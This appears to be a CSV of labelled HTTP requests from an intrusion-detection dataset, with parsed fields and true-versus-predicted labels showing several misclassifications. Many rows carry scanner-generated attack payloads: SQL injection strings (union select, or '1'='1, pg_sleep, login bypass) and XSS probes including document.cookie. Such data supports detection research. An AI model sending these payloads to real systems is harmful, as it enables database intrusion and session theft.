payload,raw_label,label,source_file,source_split,source_row_id,sample_id,payload_raw,payload_norm,request_line,request_line_norm,request_method,request_target,path_only,path_norm,query_string,query_norm,headers_text,headers_norm,body_text,body_norm,host_header,user_agent,content_type,tfidf_text,y_true,y_pred
"GET /sub_04_1.php?search=%27 union select database() HTTP/1.1\r\nHost: lab.college.school\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nConnection: close\r\n\r\n",SQL_Injection,SQL_Injection,SQL_Injection.csv,unspecified,12764,SQL_Injection.csv::12764,"GET /sub_04_1.php?search=%27 union select database() HTTP/1.1
Host: lab.college.school
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

","get /sub_04_1.php?search=' union select database() http/1.1 host: lab.college.school upgrade-insecure-requests: 1 user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/107.0.5304.63 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 accept-encoding: gzip, deflate accept-language: ko-kr,ko;q=0.9,en-us;q=0.8,en;q=0.7 connection: close",GET /sub_04_1.php?search=%27 union select database() HTTP/1.1,get /sub_04_1.php?search=' union select database() http/1.1,,,,,,,"Host: lab.college.school
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close","host: lab.college.school upgrade-insecure-requests: 1 user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/107.0.5304.63 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 accept-encoding: gzip, deflate accept-language: ko-kr,ko;q=0.9,en-us;q=0.8,en;q=0.7 connection: close",,,lab.college.school,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36",,"host: lab.college.school upgrade-insecure-requests: 1 user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/107.0.5304.63 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 accept-encoding: gzip, deflate accept-language: ko-kr,ko;q=0.9,en-us;q=0.8,en;q=0.7 connection: close",SQL_Injection,PortScan
"GET /jenkins/scripts/message/message_dialog.tml?how_many_back=\\\""><script>alert(1)</script> HTTP/1.1\r\nContent-Length: 57\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: domainabc123.college.school\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006195)\r\nConnection: Keep-Alive\r\n\r\nmethod=open+service%3a3%2e0%2e2%2e1105&service%5fname=%2f",HOST_Scan,PortScan,HOST_Scan.csv,unspecified,123,HOST_Scan.csv::123,"GET /jenkins/scripts/message/message_dialog.tml?how_many_back=\\\""><script>alert(1)</script> HTTP/1.1
Content-Length: 57
Content-Type: application/x-www-form-urlencoded
Host: domainabc123.college.school
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006195)
Connection: Keep-Alive

method=open+service%3a3%2e0%2e2%2e1105&service%5fname=%2f","get /jenkins/scripts/message/message_dialog.tml?how_many_back=\\\""><script>alert(1)</script> http/1.1 content-length: 57 content-type: application/x-www-form-urlencoded host: domainabc123.college.school user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:006195) connection: keep-alive method=open+service:3.0.2.1105&service_name=/","GET /jenkins/scripts/message/message_dialog.tml?how_many_back=\\\""><script>alert(1)</script> HTTP/1.1","get /jenkins/scripts/message/message_dialog.tml?how_many_back=\\\""><script>alert(1)</script> http/1.1",GET,"/jenkins/scripts/message/message_dialog.tml?how_many_back=\\\""><script>alert(1)</script>",/jenkins/scripts/message/message_dialog.tml,/jenkins/scripts/message/message_dialog.tml,"how_many_back=\\\""><script>alert(1)</script>","how_many_back=\\\""><script>alert(1)</script>","Content-Length: 57
Content-Type: application/x-www-form-urlencoded
Host: domainabc123.college.school
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006195)
Connection: Keep-Alive",content-length: 57 content-type: application/x-www-form-urlencoded host: domainabc123.college.school user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:006195) connection: keep-alive,method=open+service%3a3%2e0%2e2%2e1105&service%5fname=%2f,method=open+service:3.0.2.1105&service_name=/,domainabc123.college.school,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:006195),application/x-www-form-urlencoded,"/jenkins/scripts/message/message_dialog.tml how_many_back=\\\""><script>alert(1)</script> method=open+service:3.0.2.1105&service_name=/ content-length: 57 content-type: application/x-www-form-urlencoded host: domainabc123.college.school user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:006195) connection: keep-alive",PortScan,Cross_Site_Scripting
"CONNECT ios.prod.http1.netflix.com:443 HTTP/1.1\r\nUser-Agent: Java/1.8.0_351\r\nHost: ios.prod.http1.netflix.com\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nProxy-Connection: keep-alive\r\n\r\n",HOST_Scan,PortScan,HOST_Scan.csv,unspecified,34919,HOST_Scan.csv::34919,"CONNECT ios.prod.http1.netflix.com:443 HTTP/1.1
User-Agent: Java/1.8.0_351
Host: ios.prod.http1.netflix.com
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Proxy-Connection: keep-alive

","connect ios.prod.http1.netflix.com:443 http/1.1 user-agent: java/1.8.0_351 host: ios.prod.http1.netflix.com accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 proxy-connection: keep-alive",CONNECT ios.prod.http1.netflix.com:443 HTTP/1.1,connect ios.prod.http1.netflix.com:443 http/1.1,CONNECT,ios.prod.http1.netflix.com:443,ios.prod.http1.netflix.com:443,ios.prod.http1.netflix.com:443,,,"User-Agent: Java/1.8.0_351
Host: ios.prod.http1.netflix.com
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Proxy-Connection: keep-alive","user-agent: java/1.8.0_351 host: ios.prod.http1.netflix.com accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 proxy-connection: keep-alive",,,ios.prod.http1.netflix.com,Java/1.8.0_351,,"ios.prod.http1.netflix.com:443 user-agent: java/1.8.0_351 host: ios.prod.http1.netflix.com accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 proxy-connection: keep-alive",PortScan,Normal
GET / HTTP/1.0\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0\r\nAccept: */*\r\n\r\n,HOST_Scan,PortScan,HOST_Scan.csv,unspecified,7679,HOST_Scan.csv::7679,"GET / HTTP/1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: */*

",get / http/1.0 user-agent: mozilla/5.0 (x11; linux x86_64; rv:73.0) gecko/20100101 firefox/73.0 accept: */*,GET / HTTP/1.0,get / http/1.0,GET,/,/,/,,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: */*",user-agent: mozilla/5.0 (x11; linux x86_64; rv:73.0) gecko/20100101 firefox/73.0 accept: */*,,,,Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0,,/ user-agent: mozilla/5.0 (x11; linux x86_64; rv:73.0) gecko/20100101 firefox/73.0 accept: */*,PortScan,Normal
"GET /sub_04_1.php?page=-1839%27%20or%20%271%27%3D%271 HTTP/1.1\r\nHost: lab.college.school\r\nAuthorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8,he;q=0.6\r\nX-Arachni-Scan-Seed: 4d6dcba752fbf256edf9136809ab9888\r\nCookie: PHPSESSID=qelpc94one7qlgbv5nm3mu0oet\r\n\r\n",SQL_Injection,SQL_Injection,SQL_Injection.csv,unspecified,10071,SQL_Injection.csv::10071,"GET /sub_04_1.php?page=-1839%27%20or%20%271%27%3D%271 HTTP/1.1
Host: lab.college.school
Authorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,he;q=0.6
X-Arachni-Scan-Seed: 4d6dcba752fbf256edf9136809ab9888
Cookie: PHPSESSID=qelpc94one7qlgbv5nm3mu0oet

","get /sub_04_1.php?page=-1839' or '1'='1 http/1.1 host: lab.college.school authorization: negotiate tlrmtvntuaabaaaat4ii4gaaaaaaaaaaaaaaaaaaaaakaf1yaaaadw== accept-encoding: gzip, deflate user-agent: mozilla/5.0 (gecko) arachni/v10.0.0.80 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.8,he;q=0.6 x-arachni-scan-seed: 4d6dcba752fbf256edf9136809ab9888 cookie: phpsessid=qelpc94one7qlgbv5nm3mu0oet",GET /sub_04_1.php?page=-1839%27%20or%20%271%27%3D%271 HTTP/1.1,get /sub_04_1.php?page=-1839' or '1'='1 http/1.1,GET,/sub_04_1.php?page=-1839%27%20or%20%271%27%3D%271,/sub_04_1.php,/sub_04_1.php,page=-1839%27%20or%20%271%27%3D%271,page=-1839' or '1'='1,"Host: lab.college.school
Authorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,he;q=0.6
X-Arachni-Scan-Seed: 4d6dcba752fbf256edf9136809ab9888
Cookie: PHPSESSID=qelpc94one7qlgbv5nm3mu0oet","host: lab.college.school authorization: negotiate tlrmtvntuaabaaaat4ii4gaaaaaaaaaaaaaaaaaaaaakaf1yaaaadw== accept-encoding: gzip, deflate user-agent: mozilla/5.0 (gecko) arachni/v10.0.0.80 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.8,he;q=0.6 x-arachni-scan-seed: 4d6dcba752fbf256edf9136809ab9888 cookie: phpsessid=qelpc94one7qlgbv5nm3mu0oet",,,lab.college.school,Mozilla/5.0 (Gecko) Arachni/v10.0.0.80,,"/sub_04_1.php page=-1839' or '1'='1 host: lab.college.school authorization: negotiate tlrmtvntuaabaaaat4ii4gaaaaaaaaaaaaaaaaaaaaakaf1yaaaadw== accept-encoding: gzip, deflate user-agent: mozilla/5.0 (gecko) arachni/v10.0.0.80 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.8,he;q=0.6 x-arachni-scan-seed: 4d6dcba752fbf256edf9136809ab9888 cookie: phpsessid=qelpc94one7qlgbv5nm3mu0oet",SQL_Injection,PortScan
GET /ws/servlet/AdminServlet HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Length: 47\r\nHost: 10.0.17.21\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007111)\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n<script>alert('XSS')</script>[]=PATH DISCLOSURE,HOST_Scan,PortScan,HOST_Scan.csv,unspecified,13429,HOST_Scan.csv::13429,"GET /ws/servlet/AdminServlet HTTP/1.1
Connection: Keep-Alive
Content-Length: 47
Host: 10.0.17.21
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007111)
Content-Type: application/x-www-form-urlencoded

<script>alert('XSS')</script>[]=PATH DISCLOSURE",get /ws/servlet/adminservlet http/1.1 connection: keep-alive content-length: 47 host: 10.0.17.21 user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007111) content-type: application/x-www-form-urlencoded <script>alert('xss')</script>[]=path disclosure,GET /ws/servlet/AdminServlet HTTP/1.1,get /ws/servlet/adminservlet http/1.1,GET,/ws/servlet/AdminServlet,/ws/servlet/AdminServlet,/ws/servlet/adminservlet,,,"Connection: Keep-Alive
Content-Length: 47
Host: 10.0.17.21
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007111)
Content-Type: application/x-www-form-urlencoded",connection: keep-alive content-length: 47 host: 10.0.17.21 user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007111) content-type: application/x-www-form-urlencoded,<script>alert('XSS')</script>[]=PATH DISCLOSURE,<script>alert('xss')</script>[]=path disclosure,10.0.17.21,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007111),application/x-www-form-urlencoded,/ws/servlet/adminservlet <script>alert('xss')</script>[]=path disclosure connection: keep-alive content-length: 47 host: 10.0.17.21 user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007111) content-type: application/x-www-form-urlencoded,PortScan,Cross_Site_Scripting
GET /connection.json HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 10.0.17.21\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007208)\r\nContent-Length: 47\r\n\r\n<script>alert('XSS')</script>[]=PATH DISCLOSURE,HOST_Scan,PortScan,HOST_Scan.csv,unspecified,24152,HOST_Scan.csv::24152,"GET /connection.json HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 10.0.17.21
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007208)
Content-Length: 47

<script>alert('XSS')</script>[]=PATH DISCLOSURE",get /connection.json http/1.1 content-type: application/x-www-form-urlencoded host: 10.0.17.21 connection: keep-alive user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007208) content-length: 47 <script>alert('xss')</script>[]=path disclosure,GET /connection.json HTTP/1.1,get /connection.json http/1.1,GET,/connection.json,/connection.json,/connection.json,,,"Content-Type: application/x-www-form-urlencoded
Host: 10.0.17.21
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007208)
Content-Length: 47",content-type: application/x-www-form-urlencoded host: 10.0.17.21 connection: keep-alive user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007208) content-length: 47,<script>alert('XSS')</script>[]=PATH DISCLOSURE,<script>alert('xss')</script>[]=path disclosure,10.0.17.21,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007208),application/x-www-form-urlencoded,/connection.json <script>alert('xss')</script>[]=path disclosure content-type: application/x-www-form-urlencoded host: 10.0.17.21 connection: keep-alive user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007208) content-length: 47,PortScan,Cross_Site_Scripting
"GET /emailfriend/emailarticle.php?id=\\\""<script>alert(document.cookie)</script> HTTP/1.1\r\nConnection: Keep-Alive\r\nContent-Length: 6\r\nHost: 10.0.17.19\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000706)\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nMYDATA",HOST_Scan,PortScan,HOST_Scan.csv,unspecified,26642,HOST_Scan.csv::26642,"GET /emailfriend/emailarticle.php?id=\\\""<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
Content-Length: 6
Host: 10.0.17.19
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000706)
Content-Type: application/x-www-form-urlencoded

MYDATA","get /emailfriend/emailarticle.php?id=\\\""<script>alert(document.cookie)</script> http/1.1 connection: keep-alive content-length: 6 host: 10.0.17.19 user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:000706) content-type: application/x-www-form-urlencoded mydata","GET /emailfriend/emailarticle.php?id=\\\""<script>alert(document.cookie)</script> HTTP/1.1","get /emailfriend/emailarticle.php?id=\\\""<script>alert(document.cookie)</script> http/1.1",GET,"/emailfriend/emailarticle.php?id=\\\""<script>alert(document.cookie)</script>",/emailfriend/emailarticle.php,/emailfriend/emailarticle.php,"id=\\\""<script>alert(document.cookie)</script>","id=\\\""<script>alert(document.cookie)</script>","Connection: Keep-Alive
Content-Length: 6
Host: 10.0.17.19
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000706)
Content-Type: application/x-www-form-urlencoded",connection: keep-alive content-length: 6 host: 10.0.17.19 user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:000706) content-type: application/x-www-form-urlencoded,MYDATA,mydata,10.0.17.19,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000706),application/x-www-form-urlencoded,"/emailfriend/emailarticle.php id=\\\""<script>alert(document.cookie)</script> mydata connection: keep-alive content-length: 6 host: 10.0.17.19 user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:000706) content-type: application/x-www-form-urlencoded",PortScan,Cross_Site_Scripting
"POST /member/login HTTP/1.0\r\nHost: 10.0.17.19\r\nUser-Agent: Mozilla/5.0 (Hydra)\r\nContent-Length: 53\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: designart_site=roan7ks2o75uvlfqtbouchr8o31n3rhh\r\n\r\nencrypt=p2&userid=test2&password=\""a\""\""%20or%203%3D3--\""",SQL_Injection,SQL_Injection,SQL_Injection.csv,unspecified,20813,SQL_Injection.csv::20813,"POST /member/login HTTP/1.0
Host: 10.0.17.19
User-Agent: Mozilla/5.0 (Hydra)
Content-Length: 53
Content-Type: application/x-www-form-urlencoded
Cookie: designart_site=roan7ks2o75uvlfqtbouchr8o31n3rhh

encrypt=p2&userid=test2&password=\""a\""\""%20or%203%3D3--\""","post /member/login http/1.0 host: 10.0.17.19 user-agent: mozilla/5.0 (hydra) content-length: 53 content-type: application/x-www-form-urlencoded cookie: designart_site=roan7ks2o75uvlfqtbouchr8o31n3rhh encrypt=p2&userid=test2&password=\""a\""\"" or 3=3--\""",POST /member/login HTTP/1.0,post /member/login http/1.0,POST,/member/login,/member/login,/member/login,,,"Host: 10.0.17.19
User-Agent: Mozilla/5.0 (Hydra)
Content-Length: 53
Content-Type: application/x-www-form-urlencoded
Cookie: designart_site=roan7ks2o75uvlfqtbouchr8o31n3rhh",host: 10.0.17.19 user-agent: mozilla/5.0 (hydra) content-length: 53 content-type: application/x-www-form-urlencoded cookie: designart_site=roan7ks2o75uvlfqtbouchr8o31n3rhh,"encrypt=p2&userid=test2&password=\""a\""\""%20or%203%3D3--\""","encrypt=p2&userid=test2&password=\""a\""\"" or 3=3--\""",10.0.17.19,Mozilla/5.0 (Hydra),application/x-www-form-urlencoded,"/member/login encrypt=p2&userid=test2&password=\""a\""\"" or 3=3--\"" host: 10.0.17.19 user-agent: mozilla/5.0 (hydra) content-length: 53 content-type: application/x-www-form-urlencoded cookie: designart_site=roan7ks2o75uvlfqtbouchr8o31n3rhh",SQL_Injection,PortScan
GET /user0001!!/EchoHeaders.jws?method=list HTTP/1.1\r\nContent-Length: 47\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007113)\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 10.0.17.19\r\n\r\n<script>alert('XSS')</script>[]=PATH DISCLOSURE,Cross_Site_Scripting,Cross_Site_Scripting,Cross_Site_Scripting.csv,unspecified,8133,Cross_Site_Scripting.csv::8133,"GET /user0001!!/EchoHeaders.jws?method=list HTTP/1.1
Content-Length: 47
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007113)
Content-Type: application/x-www-form-urlencoded
Host: 10.0.17.19

<script>alert('XSS')</script>[]=PATH DISCLOSURE",get /user0001!!/echoheaders.jws?method=list http/1.1 content-length: 47 connection: keep-alive user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007113) content-type: application/x-www-form-urlencoded host: 10.0.17.19 <script>alert('xss')</script>[]=path disclosure,GET /user0001!!/EchoHeaders.jws?method=list HTTP/1.1,get /user0001!!/echoheaders.jws?method=list http/1.1,GET,/user0001!!/EchoHeaders.jws?method=list,/user0001!!/EchoHeaders.jws,/user0001!!/echoheaders.jws,method=list,method=list,"Content-Length: 47
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007113)
Content-Type: application/x-www-form-urlencoded
Host: 10.0.17.19",content-length: 47 connection: keep-alive user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007113) content-type: application/x-www-form-urlencoded host: 10.0.17.19,<script>alert('XSS')</script>[]=PATH DISCLOSURE,<script>alert('xss')</script>[]=path disclosure,10.0.17.19,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:007113),application/x-www-form-urlencoded,/user0001!!/echoheaders.jws method=list <script>alert('xss')</script>[]=path disclosure content-length: 47 connection: keep-alive user-agent: mozilla/5.00 (nikto/2.1.6) (evasions:none) (test:007113) content-type: application/x-www-form-urlencoded host: 10.0.17.19,Cross_Site_Scripting,PortScan
"GET /board/board_view?code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183%3Bselect%20pg_sleep%284%29%3B%20--%20 HTTP/1.1\r\nHost: www.college.school\r\nAuthorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8,he;q=0.6\r\nX-Arachni-Scan-Seed: 4818b1cc56353e785f9bfe9b055b7183\r\nCookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp\r\n\r\n",SQL_Injection,SQL_Injection,SQL_Injection.csv,unspecified,39251,SQL_Injection.csv::39251,"GET /board/board_view?code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183%3Bselect%20pg_sleep%284%29%3B%20--%20 HTTP/1.1
Host: www.college.school
Authorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,he;q=0.6
X-Arachni-Scan-Seed: 4818b1cc56353e785f9bfe9b055b7183
Cookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp

","get /board/board_view?code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183;select pg_sleep(4); -- http/1.1 host: www.college.school authorization: negotiate tlrmtvntuaabaaaat4ii4gaaaaaaaaaaaaaaaaaaaaakaf1yaaaadw== accept-encoding: gzip, deflate user-agent: mozilla/5.0 (gecko) arachni/v10.0.0.80 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.8,he;q=0.6 x-arachni-scan-seed: 4818b1cc56353e785f9bfe9b055b7183 cookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp",GET /board/board_view?code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183%3Bselect%20pg_sleep%284%29%3B%20--%20 HTTP/1.1,get /board/board_view?code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183;select pg_sleep(4); -- http/1.1,GET,/board/board_view?code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183%3Bselect%20pg_sleep%284%29%3B%20--%20,/board/board_view,/board/board_view,code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183%3Bselect%20pg_sleep%284%29%3B%20--%20,code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183;select pg_sleep(4); --,"Host: www.college.school
Authorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,he;q=0.6
X-Arachni-Scan-Seed: 4818b1cc56353e785f9bfe9b055b7183
Cookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp","host: www.college.school authorization: negotiate tlrmtvntuaabaaaat4ii4gaaaaaaaaaaaaaaaaaaaaakaf1yaaaadw== accept-encoding: gzip, deflate user-agent: mozilla/5.0 (gecko) arachni/v10.0.0.80 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.8,he;q=0.6 x-arachni-scan-seed: 4818b1cc56353e785f9bfe9b055b7183 cookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp",,,www.college.school,Mozilla/5.0 (Gecko) Arachni/v10.0.0.80,,"/board/board_view code=notice&no=11_arachni_trainer_4818b1cc56353e785f9bfe9b055b7183;select pg_sleep(4); -- host: www.college.school authorization: negotiate tlrmtvntuaabaaaat4ii4gaaaaaaaaaaaaaaaaaaaaakaf1yaaaadw== accept-encoding: gzip, deflate user-agent: mozilla/5.0 (gecko) arachni/v10.0.0.80 accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 accept-language: en-us,en;q=0.8,he;q=0.6 x-arachni-scan-seed: 4818b1cc56353e785f9bfe9b055b7183 cookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp",SQL_Injection,PortScan
